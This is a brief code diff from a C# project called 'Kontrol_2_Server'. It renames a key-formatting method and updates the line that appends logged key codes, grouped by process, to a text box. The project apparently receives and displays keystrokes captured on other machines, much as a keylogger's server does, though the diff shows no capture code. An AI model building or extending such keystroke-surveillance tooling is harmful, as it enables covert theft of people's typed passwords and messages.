@@ -27,7 +27,7 @@ namespace Kontrol_2_Server
             InitializeComponent();
         }
 
-        string VerifyKey(int key)
+        static string KeyToString(int key)
         {
             string keyStr;
 
@@ -146,7 +146,7 @@ namespace Kontrol_2_Server
         {
             this.Invoke(new MethodInvoker(delegate
             {
-                if (prevLogStruct.Process == log.Process) logBox.Text += VerifyKey(log.Key);
+                if (prevLogStruct.Process == log.Process) logBox.Text += KeyToString(log.Key);
                 else
                 {
                     logBox.ForeColor = Color.Blue;
